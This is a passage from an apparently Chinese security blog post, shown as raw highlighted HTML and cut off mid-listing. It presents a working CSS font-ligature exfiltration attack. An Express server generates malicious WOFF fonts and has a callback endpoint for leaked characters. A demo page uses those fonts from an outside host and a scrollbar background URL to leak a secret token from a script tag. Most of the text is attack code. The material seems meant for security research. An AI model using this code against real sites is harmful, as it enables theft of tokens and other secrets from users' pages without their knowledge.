class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> app = express();</span><br><span class="line"><span class="hljs-comment">// Serwer ExprssJS domyślnie dodaje nagłówek ETag,</span></span><br><span class="line"><span class="hljs-comment">// ale nam nie jest to potrzebne, więc wyłączamy.</span></span><br><span class="line">app.disable(<span class="hljs-string">'etag'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">3001</span>;</span><br><span class="line"><span class="hljs-keyword">const</span> js2xmlparser = <span class="hljs-built_in">require</span>(<span class="hljs-string">'js2xmlparser'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> tmp = <span class="hljs-built_in">require</span>(<span class="hljs-string">'tmp'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> rimraf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'rimraf'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> child_process = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Generujemy fonta dla zadanego przedrostka</span></span><br><span class="line"><span class="hljs-comment">// i znaków, dla których ma zostać utworzona ligatura.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createFont</span>(<span class="hljs-params">prefix, charsToLigature</span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">let</span> font = {</span><br><span class="line">        <span class="hljs-string">"defs"</span>: {</span><br><span class="line">            <span class="hljs-string">"font"</span>: {</span><br><span class="line">                <span class="hljs-string">"@"</span>: {</span><br><span class="line">                    <span class="hljs-string">"id"</span>: <span class="hljs-string">"hack"</span>,</span><br><span class="line">                    <span class="hljs-string">"horiz-adv-x"</span>: <span class="hljs-string">"0"</span></span><br><span class="line">                },</span><br><span class="line">                <span class="hljs-string">"font-face"</span>: {</span><br><span class="line">                    <span class="hljs-string">"@"</span>: {</span><br><span class="line">                        <span class="hljs-string">"font-family"</span>: <span class="hljs-string">"hack"</span>,</span><br><span class="line">                        <span class="hljs-string">"units-per-em"</span>: <span class="hljs-string">"1000"</span></span><br><span class="line">                    }</span><br><span class="line">                },</span><br><span class="line">                <span class="hljs-string">"glyph"</span>: []</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    };</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// Domyślnie wszystkie możliwe znaki mają zerową szerokość...</span></span><br><span class="line">    <span class="hljs-keyword">let</span> glyphs = font.defs.font.glyph;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> c = <span class="hljs-number">0x20</span>; c &lt;= <span class="hljs-number">0x7e</span>; c += <span class="hljs-number">1</span>) {</span><br><span class="line">        <span class="hljs-keyword">const</span> glyph = {</span><br><span class="line">            <span class="hljs-string">"@"</span>: {</span><br><span class="line">                <span class="hljs-string">"unicode"</span>: <span class="hljs-built_in">String</span>.fromCharCode(c),</span><br><span class="line">                <span class="hljs-string">"horiz-adv-x"</span>: <span class="hljs-string">"0"</span>,</span><br><span class="line">                <span class="hljs-string">"d"</span>: <span class="hljs-string">"M1 0z"</span>,</span><br><span class="line">            }</span><br><span class="line">        };</span><br><span class="line">        glyphs.push(glyph);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// ... za wyjątkiem ligatur, które są BARDZO szerokie.</span></span><br><span class="line">    charsToLigature.forEach(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> {</span><br><span class="line">        <span class="hljs-keyword">const</span> glyph = {</span><br><span class="line">            <span class="hljs-string">"@"</span>: {</span><br><span class="line">                <span class="hljs-string">"unicode"</span>: prefix + c,</span><br><span class="line">                <span class="hljs-string">"horiz-adv-x"</span>: <span class="hljs-string">"10000"</span>,</span><br><span class="line">                <span class="hljs-string">"d"</span>: <span class="hljs-string">"M1 0z"</span>,</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        glyphs.push(glyph);</span><br><span class="line">    });</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// Konwertujemy JSON-a na SVG.</span></span><br><span class="line">    <span class="hljs-keyword">const</span> xml = js2xmlparser.parse(<span class="hljs-string">"svg"</span>, font);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// A następnie wykorzystujemy fontforge</span></span><br><span class="line">    <span class="hljs-comment">// do zamiany SVG na WOFF.</span></span><br><span class="line">    <span class="hljs-keyword">const</span> tmpobj = tmp.dirSync();</span><br><span class="line">    fs.writeFileSync(<span class="hljs-string">`<span class="hljs-subst">${tmpobj.name}</span>/font.svg`</span>, xml);</span><br><span class="line">    child_process.spawnSync(<span class="hljs-string">"/usr/bin/fontforge"</span>, [</span><br><span class="line">        <span class="hljs-string">`<span class="hljs-subst">${__dirname}</span>/script.fontforge`</span>,</span><br><span class="line">        <span class="hljs-string">`<span class="hljs-subst">${tmpobj.name}</span>/font.svg`</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">const</span> woff = fs.readFileSync(<span class="hljs-string">`<span class="hljs-subst">${tmpobj.name}</span>/font.woff`</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// Usuwamy katalog tymczasowy.</span></span><br><span class="line">    rimraf.sync(tmpobj.name);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// I zwracamy fonta w postaci WOFF.</span></span><br><span class="line">    <span class="hljs-keyword">return</span> woff;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Endpoint do generowania fontów.</span></span><br><span class="line">app.get(<span class="hljs-string">"/font/:prefix/:charsToLigature"</span>, (req, res) =&gt; {</span><br><span class="line">    <span class="hljs-keyword">const</span> { prefix, charsToLigature } = req.params;</span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">// Dbamy o to by font znalazł się w cache'u.</span></span><br><span class="line">    res.set({</span><br><span class="line">        <span class="hljs-string">'Cache-Control'</span>: <span class="hljs-string">'public, max-age=600'</span>,</span><br><span class="line">        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/font-woff'</span>,</span><br><span class="line">        <span class="hljs-string">'Access-Control-Allow-Origin'</span>: <span class="hljs-string">'*'</span>,</span><br><span class="line">    });</span><br><span class="line">    </span><br><span class="line">    res.send(createFont(prefix, <span class="hljs-built_in">Array</span>.from(charsToLigature)));</span><br><span class="line">     </span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Endpoint do przyjmowania znaków przez połączenie zwrotne</span></span><br><span class="line">app.get(<span class="hljs-string">"/reverse/:chars"</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>{</span><br><span class="line">    res.cookie(<span class="hljs-string">'chars'</span>, req.params.chars);</span><br><span class="line">    res.set(<span class="hljs-string">'Set-Cookie'</span>, <span class="hljs-string">`chars=<span class="hljs-subst">${<span class="hljs-built_in">encodeURIComponent</span>(req.params.chars)}</span>; Path=/`</span>);</span><br><span class="line">    res.send();</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/cookie.js'</span>, (req, res) =&gt; {</span><br><span class="line">trueres.sendFile(<span class="hljs-string">'js.cookie.js'</span>, {</span><br><span class="line">truetrueroot: <span class="hljs-string">'./node_modules/js-cookie/src/'</span></span><br><span class="line">true});</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.get(<span class="hljs-string">'/index.html'</span>, (req, res) =&gt; {</span><br><span class="line">trueres.sendFile(<span class="hljs-string">'index.html'</span>, {</span><br><span class="line">truetrueroot: <span class="hljs-string">'.'</span></span><br><span class="line">true});</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line">app.listen(PORT, () =&gt; {</span><br><span class="line">true<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Listening on <span class="hljs-subst">${PORT}</span>...`</span>);</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我们先只用到<code>/font</code>的 api 用来直接生成我们需要的 woff 文件，然后我们构造两个页面，第一个 test.html ，包含我们需要获取的 token2 ，有以下代码：</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-keyword">var</span> token2 = <span class="hljs-string">"7b8a45b8297cf82cc3cefc174c3ae5a1"</span>;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-css">        <span class="hljs-keyword">@font-face</span> {</span></span><br><span class="line">            font-family: "hack";</span><br><span class="line">            src: url(http://172.16.71.138:3001/font/%22/7);</span><br><span class="line">        }</span><br><span class="line">        script {</span><br><span class="line">            display: table;</span><br><span class="line">            font-family: "hack";</span><br><span class="line">            white-space: nowrap;</span><br><span class="line">            background: lightblue;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">body</span><span class="hljs-selector-pseudo">::-webkit-scrollbar</span> {</span></span><br><span class="line">            background: blue;</span><br><span class="line">        }</span><br><span class="line"><span class="hljs-css">        <span class="hljs-selector-tag">body</span><span class="hljs-selector-pseudo">::-webkit-scrollbar</span><span class="hljs-selector-pseudo">:horizontal</span> {</span></span><br><span class="line"><span class="hljs-css">            <span class="hljs-selector-tag">display</span><span class="hljs-selector-pseudo">:block</span>;</span></span><br><span class="line">            background: blue url(http://127.0.0.1:9999);</span><br><span class="line">        }</span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>我们这里用<code>display:table</code>将<code>script</code>标签内的内容输出出来，然后禁止换行，并使用我们构造的字体。那个 url 获取到的就是以下 svg 生成的 woff 文件：</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version='1.0'?&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">defs</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'hack'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">font-face</span> <span class="hljs-attr">font-family</span>=<span class="hljs-string">'hack'</span> <span class="hljs-attr">units-per-em</span>=<span class="hljs-string">'1000'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">' '</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'!'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'"'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'$'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'%'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'<span class="hljs-symbol">&amp;amp;</span>'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'<span class="hljs-symbol">&amp;apos;</span>'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'('</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">')'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'*'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'+'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">','</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'-'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'.'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'/'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'1'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'2'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'3'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'4'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'5'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'6'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'7'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'8'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'9'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">':'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">';'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'<span class="hljs-symbol">&amp;lt;</span>'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'='</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'&gt;'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'?'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'@'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'A'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'B'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'C'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'D'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'E'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'F'</span> <span class="hljs-attr">horiz-adv-x</span>=<span class="hljs-string">'0'</span> <span class="hljs-attr">d</span>=<span class="hljs-string">'M1 0z'</span>/&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">glyph</span> <span class="hljs-attr">unicode</span>=<span class="hljs-string">'G'</span> <span 